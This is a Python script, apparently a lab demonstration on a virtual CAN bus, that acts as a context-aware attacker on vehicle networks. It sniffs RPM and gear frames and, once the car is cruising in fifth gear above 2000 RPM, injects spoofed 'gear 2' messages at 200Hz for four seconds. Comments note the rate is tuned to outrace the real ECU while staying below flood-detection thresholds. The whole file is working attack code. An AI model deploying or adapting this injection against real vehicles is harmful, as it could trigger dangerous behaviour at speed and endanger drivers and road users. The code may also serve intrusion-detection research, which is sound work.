import can
import time
import threading

class ContextAwareAttacker:
    def __init__(self, interface='vcan0'):
        self.interface = interface
        self.bus = None
        self.running = False
        self.current_rpm = 0
        self.current_gear = 0
        
    def start(self):
        print("🕵️  Attacker: Listening...")
        try:
            self.bus = can.ThreadSafeBus(channel=self.interface, interface='socketcan')
        except OSError:
            print(f"❌ Error: Could not bind to {self.interface}.")
            return

        self.running = True
        
        sniffer = threading.Thread(target=self._sniff_traffic)
        sniffer.start()
        
        try:
            self._execute_logic()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.running = False
        if self.bus: self.bus.shutdown()
        print("\n🛑 Attacker Stopped.")

    def _sniff_traffic(self):
        while self.running:
            msg = self.bus.recv(timeout=1.0)
            if not msg: continue
            
            if msg.arbitration_id == 0x123:
                self.current_rpm = int(int.from_bytes(msg.data, 'big') * 0.25)
            elif msg.arbitration_id == 0x310:
                self.current_gear = int(msg.data[0])

    def _execute_logic(self):
        print("⚔️  Waiting for CRUISING (Gear 5)...")
        while self.running:
            time.sleep(0.1)
            
            # Context Trigger
            if self.current_gear == 5 and self.current_rpm > 2000:
                print(f"\n🎯 TARGET ACQUIRED (RPM {self.current_rpm}). INJECTING GEAR 2...")
                
                # === TUNED INJECTION ===
                # Real ECU sends every 0.1s (10Hz).
                # We send every 0.005s (200Hz).
                # This is 20x faster (winning the race), but NOT a Flood (< 2000Hz).
                
                end_time = time.time() + 4
                fake_msg = can.Message(arbitration_id=0x310, data=b'\x02\x00\x00\x00', is_extended_id=False)
                
                while time.time() < end_time:
                    self.bus.send(fake_msg)
                    time.sleep(0.005) # 5ms interval
                
                print("✅ Injection Complete. Backing off...")
                time.sleep(10)

if __name__ == "__main__":
    ContextAwareAttacker().start()
